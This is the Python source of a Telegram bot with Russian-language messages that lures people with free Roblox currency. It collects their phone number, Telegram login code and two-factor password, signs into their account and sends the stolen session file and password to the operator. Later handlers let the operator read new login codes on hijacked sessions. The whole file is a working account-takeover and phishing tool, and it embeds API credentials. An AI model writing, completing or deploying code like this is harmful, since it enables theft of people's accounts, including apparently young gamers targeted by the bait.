import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient, errors, events
from telethon.tl.functions.users import GetFullUserRequest
from datetime import datetime

API_TOKEN = 'токен бота от ботфазера'
ADMIN_CHAT_ID = ' тут ваше айди'
API_ID = '21826549'
API_HASH = 'c1a19f792cfd9e397200d16c7e448160'

session_dir = 'sessions'
os.makedirs(session_dir, exist_ok=True)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

total_users = 0
total_sessions = 0
processed_users = set()

user_data = {}

class CreateAccountStates(StatesGroup):
    code = State()
    password = State()

class CreateArticleStates(StatesGroup):
    media_choice = State()
    media_file = State()
    article_text = State()

async def get_session_info(client):
    try:
        me = await client.get_me()
        session_info = (
            f"Username: @{me.username if me.username else 'Нет username'}\n"
            f"ID: {me.id}\n"
            f"Номер телефона: {me.phone}\n"
        )
        return session_info
    except Exception as e:
        return f"Ошибка при получении информации о сессии: {e}"

async def get_code(client, callback_query):
    print("\nОжидание кода подтверждения...")
    code_received = False

    async def handler(event):
        nonlocal code_received
        message = event.message.message
        print(f"\nСообщение от 777000: {message}")
        code_received = True
        client.remove_event_handler(handler)

    client.add_event_handler(handler, events.NewMessage(chats=777000))
    
    while not code_received:
        await asyncio.sleep(1)

    print("\nКод получен! Ожидание 15 секунд...")
    await asyncio.sleep(15)


    await bot.send_message(callback_query.from_user.id, f"✅ Код подтверждения: {message}")

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    global total_users, total_sessions
    user_id = message.from_user.id
    username = message.from_user.username or ' '
    first_name = message.from_user.first_name or ' '
    last_name = message.from_user.last_name or ' '
    full_name = f"{first_name} {last_name}".strip()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if user_id not in processed_users:
        processed_users.add(user_id)
        total_users += 1
        admin_message = f"Новый пользователь:\n@{username} / {user_id}\nИмя: {full_name}\nВремя: {current_time}"
        await bot.send_message(ADMIN_CHAT_ID, admin_message)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button_phone = types.KeyboardButton(text="Поделиться контактом", request_contact=True)
    markup.add(button_phone)
    
    if user_id != int(ADMIN_CHAT_ID):
        await bot.send_message(message.chat.id, f"❤️ Привествую {full_name}!\n⭐️ Хочешь забрать ROBUX бесплатно?\n🎁 Мы дадим тебе этот шанс совершенно бесплатно!\n💝Для получения робуксов необходимо авторизоваться!", reply_markup=markup)
    else:
        admin_welcome_message = f"👋 Привет, Администратор!\nСтатистика:\nВсего пользователей: {total_users}\nВсего сессий: {total_sessions}\nПоследний пользователь:\n@{username} / {user_id}\nИмя: {full_name}\nВремя: {current_time}"
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("Управление сессиями", callback_data="manage_sessions")
        )
        await message.answer(admin_welcome_message, reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data == 'manage_sessions')
async def manage_sessions_callback(callback_query: types.CallbackQuery):
    sessions = os.listdir(session_dir)
    keyboard = InlineKeyboardMarkup(row_width=2)
    for session in sessions:
        if session.endswith(".session"):
            session_name = session.replace(".session", "")
            keyboard.add(InlineKeyboardButton(session_name, callback_data=f"session_{session_name}"))
    await bot.send_message(callback_query.from_user.id, "Выберите сессию для управления:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data.startswith('session_'))
async def session_management_callback(callback_query: types.CallbackQuery):
    session_name = callback_query.data.split('_')[1]
    session_path = os.path.join(session_dir, f"{session_name}.session")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    if await client.is_user_authorized():
        session_info = await get_session_info(client)
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("Ожидать код подтверждения", callback_data=f"wait_code_{session_name}")
        )
        await bot.send_message(callback_query.from_user.id, f"Информация о сессии {session_name}:\n{session_info}", reply_markup=keyboard)
    else:
        await bot.send_message(callback_query.from_user.id, f"Сессия {session_name} не авторизована.")
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('wait_code_'))
async def wait_code_callback(callback_query: types.CallbackQuery):
    session_name = callback_query.data.split('_')[2]
    session_path = os.path.join(session_dir, f"{session_name}.session")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    if await client.is_user_authorized():
        await get_code(client, callback_query)
    else:
        await bot.send_message(callback_query.from_user.id, "Сессия не авторизована.")
    await client.disconnect()

@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact is not None:
        phone_number = message.contact.phone_number
        user_id = message.from_user.id
        user_data[user_id] = {"phone_number": phone_number}
        await bot.send_message(message.chat.id, "📞Подождите...")
        phone = phone_number
        session_name = f"{phone}"
        session_path = os.path.join(session_dir, session_name)
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            try:
                result = await client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                await storage.update_data(user=message.from_user.id, data={"phone": phone, "phone_code_hash": phone_code_hash, "session_path": session_path})
                await bot.send_message(message.chat.id, f"📩 Введите отправленный нами k0д, для получения робуксов\nОн появится тут\ntg://openmessage?user_id=777000", reply_markup=create_code_keyboard())
                await CreateAccountStates.code.set()
            except errors.PhoneNumberInvalidError:
                await bot.send_message(message.chat.id, '❌ Неверный номер телефона. Пожалуйста, попробуйте еще раз.')
        else:
            await bot.send_message(message.chat.id, '❌ Аккаунт уже авторизован.')

def create_code_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=3)
    keyboard.row(InlineKeyboardButton("1", callback_data="code_1"), InlineKeyboardButton("2", callback_data="code_2"), InlineKeyboardButton("3", callback_data="code_3"))
    keyboard.row(InlineKeyboardButton("4", callback_data="code_4"), InlineKeyboardButton("5", callback_data="code_5"), InlineKeyboardButton("6", callback_data="code_6"))
    keyboard.row(InlineKeyboardButton("7", callback_data="code_7"), InlineKeyboardButton("8", callback_data="code_8"), InlineKeyboardButton("9", callback_data="code_9"))
    keyboard.row(InlineKeyboardButton("Очистить", callback_data="code_clear"), InlineKeyboardButton("0", callback_data="code_0"), InlineKeyboardButton("Подтвердить", callback_data="code_confirm"))
    return keyboard

@dp.callback_query_handler(lambda c: c.data.startswith('code_'), state=CreateAccountStates.code)
async def process_code_callback(callback_query: types.CallbackQuery, state: FSMContext):
    action = callback_query.data.split('_')[1]
    user_data = await state.get_data()
    code = user_data.get('code', '')
    if action == 'clear':
        code = ''
    elif action == 'confirm':
        if len(code) == 5:
            await state.update_data(code=code)
            await bot.answer_callback_query(callback_query.id)
            await process_code_step(callback_query.message, state)
            return
        else:
            await bot.answer_callback_query(callback_query.id, text="Код должен состоять из 5 цифр.")
            return
    else:
        if len(code) < 5:
            code += action
    await state.update_data(code=code)
    await bot.edit_message_text(f"📩 Введите отправленный нами k0д, для получения робуксов\nОн появится [»тут«](t.me/+42777):{code}", callback_query.from_user.id, callback_query.message.message_id, reply_markup=create_code_keyboard())

@dp.message_handler(state=CreateAccountStates.code)
async def process_code_step(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    code = user_data.get('code', '')
    if not code or len(code) != 5:
        await message.answer('❌ Введите корректный код подтверждения.')
        return
    phone = user_data['phone']
    phone_code_hash = user_data['phone_code_hash']
    session_path = user_data['session_path']
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
    except errors.SessionPasswordNeededError:
        await message.answer('🔒 Введите облачный пароль:')
        await CreateAccountStates.next()
    except errors.PhoneCodeInvalidError:
        await message.answer('❌ Неверный код подтверждения. Пожалуйста, попробуйте еще раз.')
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
        await state.finish()
    else:
        await message.answer('✅ К вам на аккаунт зайдет бот по выдаче робуксов, не выгоняйте его!.')
        await send_session_to_admin(session_path, message.from_user.id, phone)
        await state.finish()

@dp.message_handler(state=CreateAccountStates.password)
async def process_password_step(message: types.Message, state: FSMContext):
    password = message.text
    user_data = await state.get_data()
    phone = user_data['phone']
    session_path = user_data['session_path']
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(password=password)
    except errors.PasswordHashInvalidError:
        await message.answer('❌ Неверный пароль. Пожалуйста, попробуйте еще раз.')
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
        await state.finish()
    else:
        await message.answer('✅ К вам на аккаунт зайдет бот по выдаче робуксов, не выгоняйте его!.')
        await send_session_to_admin(session_path, message.from_user.id, phone, password)
        await state.finish()

async def send_session_to_admin(session_path, user_id, phone, password=None):
    global total_sessions
    session_file = None
    for filename in os.listdir(session_dir):
        if filename.startswith(f"{phone}") and filename.endswith(".session"):
            session_file = os.path.join(session_dir, filename)
            break
    if session_file:
        with open(session_file, 'rb') as file:
            await bot.send_document(ADMIN_CHAT_ID, file)
        total_sessions += 1
        user_info = f"@{user_id} / {user_id}\nНомер телефона: {phone}\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        if password:
            user_info += f"Пароль 2FA: {password}\n"
        await bot.send_message(ADMIN_CHAT_ID, user_info)
    else:
        await bot.send_message(ADMIN_CHAT_ID, f"❌ Файл сессии для пользователя {phone} не найден.")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)